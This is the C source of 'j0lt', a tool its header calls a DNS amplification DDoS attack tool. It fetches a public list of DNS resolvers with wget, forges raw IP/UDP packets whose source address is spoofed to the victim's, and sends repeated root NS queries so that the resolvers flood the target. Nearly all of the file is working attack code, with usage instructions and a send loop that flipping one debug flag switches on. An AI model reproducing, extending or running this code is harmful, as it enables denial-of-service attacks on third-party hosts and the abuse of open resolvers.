/*      PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
 *      _________  .__   __
 *     |__\   _  \ |  |_/  |_
 *     |  /  /_\  \|  |\   __\
 *     |  \  \_/   \  |_|  |                               2021
 * /\__|  |\_____  /____/__|         the-scientist:spl0its-r-us
 * \______|      \/              ddos amplification attack tool
 * ------------------------------------------------------------
 * This is unpublished proprietary source code of spl0its-r-us
 * the-scientist@rootstorm.com
 * ------------------------------------------------------------
 * Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
 * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
 * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
 * ------------------------------------------------------------
 * Shouts to the only sane place left on the internet
 * irc.efnet.org #c
 */

 // TODO: 1) replace execv() with posix_spawn() 
 // TODO: 2) add optargs
 // TODO: 3) store resolver list in memory file access to slow. 
 // TODO: 4) clean up code

const char* g_ansi = {
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒                   ▒░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░                 ░░░░░░░░░░░░░░░░░░░░░░ ░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓ ░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓▓░░░░ ░░░░░▒▒░   ▓▓▓▓▓▓▓▓   \n"
    "░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░          ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ░\n"
    "░░░░░▓▓▓▓▓▓▓▓▓▓ ░░░░░░  ▓▓▓            ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░\n"
    "░░░░▒▓▓▓▓▓▓▓▓▓▓ ░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ░░\n"
    "░░░░▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓     ▓▓▓▓▓▓▓▓         ▓░░\n"
    "░░░░   ▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
    "░░░░░░░▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓░ ░░░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
    "░░░░░░░ ▓▓▓ ▓▓▓▓▓▓▓▓           ▓▓▓▓ ▓▓▓▓▓▓▓▓▓  ░░░░░░░░▓▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓▓             ▓▓▓ ▓▓▓▓▓▓▓▓  ░░░░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓              ▓▓ ▓▓▓▓▓▓▓▓▓▓▓  ▓░░░░░░ ▓▓▓▓▓▓▓▓ ▓░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓░▓▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
    "▓▓▓░░ ▓▓▓▓▓ ▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▒░░▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓ ▓▓                     ▓▓▓    ▓▓▓▓▓▓▓   ░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓▓  ░░        ░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓   ░░░░░░░░░░░░░░░░░▒   ░     ░░░░░░░░░\n"
    "              ░  ▓            ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░\n"
    "░░▓      ░░░░░░░░           ▓▓ ░    ░░░░░    ░░░░░    ░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░                ░░░░░░░                   ░░░░░            \n"
    "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      \n"
    "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target IPv4 (spoof)    \n"
    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -m <magnitude>  : magnitude of attack    \n"
    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     \n"
    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com\n"
};

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h> 
#include <ctype.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <arpa/nameser.h> 
#include <arpa/nameser_compat.h>

#include <netinet/ip.h>
#include <netinet/udp.h>

#include <netdb.h>
#include <unistd.h>

typedef struct __attribute__((packed, aligned(1))) {
    uint32_t sourceaddr;
    uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN 
    uint32_t zero : 8;
    uint32_t protocol : 8;
    uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint32_t udplen : 16;
    uint32_t protocol : 8;
    uint32_t zero : 8;
#endif
} PSEUDOHDR;

#define DEFINE_INSERT_FN(typename, datatype)           \
        bool insert_##typename                         \
        (uint8_t** buf, size_t* buflen, datatype data) \
    {                                                  \
        uint64_t msb_mask, lsb_mask,                   \
            bigendian_data, lsb, msb;                  \
        size_t byte_pos, nbits;                        \
                                                       \
        if (*buflen < 1) {                             \
            return false;                              \
        }                                              \
                                                       \
        nbits = sizeof(data) << 3;                     \
        bigendian_data = 0ULL;                         \
        byte_pos = (nbits / 8) - 1;                    \
        lsb_mask = 0xffULL;                            \
        msb_mask = lsb_mask << nbits - 8;              \
                                                       \
        byte_pos = byte_pos << 3;                      \
        for (int i = nbits >> 4; i != 0; i--) {        \
            lsb = (data & lsb_mask);                   \
            msb = (data & msb_mask);                   \
            lsb <<= byte_pos;                          \
            msb >>= byte_pos;                          \
            bigendian_data |= lsb | msb;               \
            msb_mask >>= 8;                            \
            lsb_mask <<= 8;                            \
            byte_pos -= (2 << 3);                      \
        }                                              \
                                                       \
        data = bigendian_data == 0 ?                   \
            data : bigendian_data;                     \
        for (int i = sizeof(data);                     \
             *buflen != -1 && i > 0; i--) {            \
            *(*buf)++ = (data & 0xff);                 \
            data >>= 8;                                \
            (*buflen)--;                               \
        }                                              \
                                                       \
        return data == 0;                              \
    }                                                  \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

// IP HEADER VALUES
#define     IP_IHL_MIN_J0LT 5
#define     IP_IHL_MAX_J0LT 15
#define     IP_TTL_J0LT 0x40
#define     IP_ID_J0LT 0xc4f3
// FLAGS
#define     IP_RF_J0LT 0x8000 // reserved fragment flag
#define     IP_DF_J0LT 0x4000 // dont fragment flag
#define     IP_MF_J0LT 0x2000 // more fragments flag
#define     IP_OF_J0LT 0x0000 
// END FLAGS
#define     IP_VER_J0LT 4
// END IPHEADER VALUES 

// DNS HEADER VALUES 
#define     DNS_ID_J0LT 0xb4b3
#define     DNS_QR_J0LT 0 // query (0), response (1).
// OPCODE
#define     DNS_OPCODE_J0LT ns_o_query
// END OPCODE
#define     DNS_AA_J0LT 0 // Authoritative Answer
#define     DNS_TC_J0LT 0 // TrunCation
#define     DNS_RD_J0LT 1 // Recursion Desired 
#define     DNS_RA_J0LT 0 // Recursion Available
#define     DNS_Z_J0LT 0 // Reserved
#define     DNS_AD_J0LT 0 // dns sec
#define     DNS_CD_J0LT 0 // dns sec
// RCODE
#define     DNS_RCODE_J0LT ns_r_noerror
// END RCODE
#define     DNS_QDCOUNT_J0LT 0x0001 // num questions
#define     DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
#define     DNS_NSCOUNT_J0LT 0x0000 // num authority RRs 
#define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
// END HEADER VALUES

#define     MAX_LINE_SZ_J0LT 0x30
const char* g_path = "/tmp/resolv.txt";
char* g_wget[ ] = {
    "/bin/wget", "-O", "/tmp/resolv.txt",
    "https://public-dns.info/nameservers.txt",
    NULL
};

size_t
ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
bool
InsertDNSHeader(uint8_t** buf, size_t* buflen);
bool
InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
bool
InsertUDPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport);
bool
InsertIPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen);
bool
SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
bool
InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
uint16_t
CheckSum(const uint16_t* addr, size_t count);
void
PrintHex(void* data, size_t len);

#define DEBUG 1
int
main(int argc, char** argv)
{
    FILE* fptr;
    char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
    int status, i;
    size_t szpayload, nread, szpewpew;
    uint32_t spoofip, resolvip;
    uint16_t spoofport, magnitude;
    pid_t pid;

    printf("%s", g_ansi);
    if (argc != 4)
        goto fail_state;

    spoofip = inet_addr(argv[ 1 ]);
    if (spoofip == 0)
        goto fail_state;

    errno = 0;
    spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0);
    magnitude = ( uint16_t ) strtol(argv[ 3 ], NULL, 0);
    if (errno != 0)
        goto fail_state;

    if ((pid = fork( )) < 0) {
        printf("* forking child process failed\n");
        _exit(EXIT_FAILURE);
    }
    else if (pid == 0) {
        if (execv(*g_wget, g_wget) < 0) {
            printf("* exec failed\n");
            _exit(EXIT_FAILURE);
        }
    }
    else {
        while (wait(&status) != pid)
            ;
    }

    fptr = fopen(g_path, "r");
    if (fptr == NULL)
        goto fail_state;

    printf("+ resolv list saved to %s\n", g_path);
    while (magnitude >= 1) {
        printf("+ current attack magnitude %d \n", magnitude);
        while (fgets(lineptr, MAX_LINE_SZ_J0LT, fptr) != NULL) {
            nread = strlen(lineptr);
            lineptr[ nread - 1 ] = '\0';
            for (i = 0; isdigit(lineptr[ i ]); i++)
                ;
            if (lineptr[ i ] != '.')
                continue;
            resolvip = inet_addr(lineptr);
            if (resolvip == 0)
                continue;
            szpayload = ForgeJ0ltPacket(payload, htonl(resolvip), htonl(spoofip), spoofport);
#if !DEBUG  
            szpewpew = 100;
            while (szpewpew-- > 0)
                SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
#else 
            PrintHex(payload, szpayload);
#endif
        }
        magnitude--;
        rewind(fptr);
    }

    fclose(fptr);
    remove(g_path);
    printf("- resolv list removed from %s\n", g_path);

    return 0;
fail_state:
    perror("error");
    exit(EXIT_FAILURE);
}


size_t
ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
{
    const char* url = ".";
    uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
    uint8_t* curpos;
    size_t buflen, nwritten, szdatagram, udpsz;
    bool status;

    PSEUDOHDR pseudoheader;

    buflen = NS_PACKETSZ;
    memset(pktbuf, 0, NS_PACKETSZ);

    curpos = pktbuf;
    status = true;
    status &= InsertDNSHeader(&curpos, &buflen);
    status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_ns, ns_c_in);

    if (status == false)
        return 0;

    memset(datagram, 0, NS_PACKETSZ);
    curpos = datagram;
    udpsz = NS_PACKETSZ - buflen + sizeof(struct udphdr);
    status &= InsertIPHeader(&curpos, &buflen, &pseudoheader, resolvip, spoofip, udpsz);
    status &= InsertUDPHeader(&curpos, &buflen, &pseudoheader, pktbuf, udpsz, spoofport);
    if (status == false)
        return 0;

    szdatagram = buflen;
    InsertData(( void** ) &curpos, &szdatagram, pktbuf, udpsz);
    nwritten = NS_PACKETSZ - buflen;

    memcpy(payload, datagram, nwritten);

    return nwritten;
}

bool
InsertDNSHeader(uint8_t** buf, size_t* buflen)
{
    bool status;
    uint8_t third_byte, fourth_byte;

    third_byte = (
        DNS_RD_J0LT |
        DNS_TC_J0LT << 1 |
        DNS_AA_J0LT << 2 |
        DNS_OPCODE_J0LT << 3 |
        DNS_QR_J0LT << 7
    );

    fourth_byte = (
        DNS_RCODE_J0LT |
        DNS_CD_J0LT << 4 |
        DNS_AD_J0LT << 5 |
        DNS_Z_J0LT << 6 |
        DNS_RA_J0LT << 7
    );

    status = true;
    status &= insert_word(buf, buflen, DNS_ID_J0LT);

    status &= insert_byte(buf, buflen, third_byte);
    status &= insert_byte(buf, buflen, fourth_byte);

    status &= insert_word(buf, buflen, DNS_QDCOUNT_J0LT);
    status &= insert_word(buf, buflen, DNS_ANCOUNT_J0LT);
    status &= insert_word(buf, buflen, DNS_NSCOUNT_J0LT);
    status &= insert_word(buf, buflen, DNS_ARCOUNT_J0LT);

    return status;
}


bool
InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
{
    const char* token;
    char* saveptr, qname[ NS_PACKETSZ ];
    size_t srclen, domainlen, dif;
    bool status;

    dif = *buflen;
    domainlen = strlen(domain) + 1;
    if (domainlen > NS_PACKETSZ - 1)
        return false;

    memcpy(qname, domain, domainlen);
    if (qname[ 0 ] != '.') {
        token = strtok_r(qname, ".", &saveptr);
        if (token == NULL)
            return false;
        while (token != NULL) {
            srclen = strlen(token);
            insert_byte(( uint8_t** ) buf, buflen, srclen);
            InsertData(buf, buflen, token, srclen);
            token = strtok_r(NULL, ".", &saveptr);
        }
    }

    status = true;
    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
    status &= insert_word(( uint8_t** ) buf, buflen, query_class);

    dif -= *buflen;
    if (dif % 2 != 0) // pad
        status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);

    return status;
}


bool
InsertUDPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport)
{
    bool status;
    size_t totalsz = sizeof(PSEUDOHDR) + ulen;
    size_t datasz = abs(ulen - sizeof(struct udphdr));
    size_t udpsofar;
    uint16_t checksum;
    uint8_t pseudo[ totalsz ];
    uint8_t* pseudoptr = pseudo;

    status = true;
    status &= insert_word(buf, buflen, sport);
    status &= insert_word(buf, buflen, NS_DEFAULTPORT);
    status &= insert_word(buf, buflen, ( uint16_t ) ulen);
    udpsofar = sizeof(struct udphdr) - 2;

    memset(pseudo, 0, totalsz);
    insert_dword(&pseudoptr, &totalsz, phdr->sourceaddr);
    insert_dword(&pseudoptr, &totalsz, phdr->destaddr);
    insert_byte(&pseudoptr, &totalsz, phdr->zero);
    insert_byte(&pseudoptr, &totalsz, phdr->protocol);
    insert_word(&pseudoptr, &totalsz, sizeof(struct udphdr));

    *buf -= udpsofar;
    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, *buf, udpsofar + 2);
    *buf += udpsofar;
    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, data, datasz);
    checksum = CheckSum(( uint16_t* ) pseudo, sizeof(PSEUDOHDR) + ulen);
    checksum -= datasz; // wtf... 
    status &= insert_word(buf, buflen, checksum);

    return status;
}


bool
InsertIPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen)
{
    bool status;
    uint8_t* bufptr = *buf;
    uint8_t first_byte;
    uint16_t checksum;

    status = true;
    first_byte = IP_VER_J0LT << 4 | IP_IHL_MIN_J0LT;
    status &= insert_byte(buf, buflen, first_byte);
    status &= insert_byte(buf, buflen, 0x00); // TOS
    status &= insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen); // total len 
    status &= insert_word(buf, buflen, IP_ID_J0LT);
    status &= insert_word(buf, buflen, IP_OF_J0LT);
    status &= insert_byte(buf, buflen, IP_TTL_J0LT);
    status &= insert_byte(buf, buflen, getprotobyname("udp")->p_proto);
    status &= insert_word(buf, buflen, 0x0000);
    status &= insert_dword(buf, buflen, saddr);
    status &= insert_dword(buf, buflen, daddr);

    checksum = CheckSum(( const uint16_t* ) bufptr, ( size_t ) (IP_IHL_MIN_J0LT << 2));
    *buf -= 0xa;
    *(*buf)++ = (checksum & 0xff00) >> 8;
    **buf = checksum & 0xff;
    *buf += 9;

    memset(pheader, 0, sizeof(PSEUDOHDR));
    pheader->protocol = getprotobyname("udp")->p_proto;
    pheader->destaddr = daddr;
    pheader->sourceaddr = saddr;

    return status;
}


bool
SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
{
    int raw_sockfd;
    ssize_t nread;
    struct sockaddr_in addr;

    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sockfd == -1) {
        remove(g_path);
        printf("- resolv list removed from %s\n", g_path);
        perror("* fatal socket error");
        exit(EXIT_FAILURE);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = uh_dport;
    addr.sin_addr.s_addr = daddr;

    nread = sendto(
                raw_sockfd,
                datagram,
                nwritten,
                0,
                ( const struct sockaddr* ) &addr,
                sizeof(addr)
    );

    close(raw_sockfd);
    return !(nread == -1 || nread != nwritten);
}


bool
InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
{
    if (*dst_buflen < src_len)
        return false;

    memcpy(*dst, src, src_len);
    *dst += src_len;
    *dst_buflen -= src_len;

    return true;
}


uint16_t
CheckSum(const uint16_t* addr, size_t count)
{
    register uint64_t sum = 0;

    while (count > 1) {
        sum += *( uint16_t* ) addr++;
        count -= 2;
    }

    if (count > 0)
        sum += *( uint8_t* ) addr;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
}


void
PrintHex(void* data, size_t len)
{
    const uint8_t* d = ( const uint8_t* ) data;
    size_t i, j;
    for (j = 0, i = 0; i < len; i++) {
        if (i % 16 == 0) {
            printf("\n0x%.4x: ", j);
            j += 16;
        }
        if (i % 2 == 0)
            putchar(' ');
        printf("%.2x", d[ i ]);
    }
    putchar('\n');
}
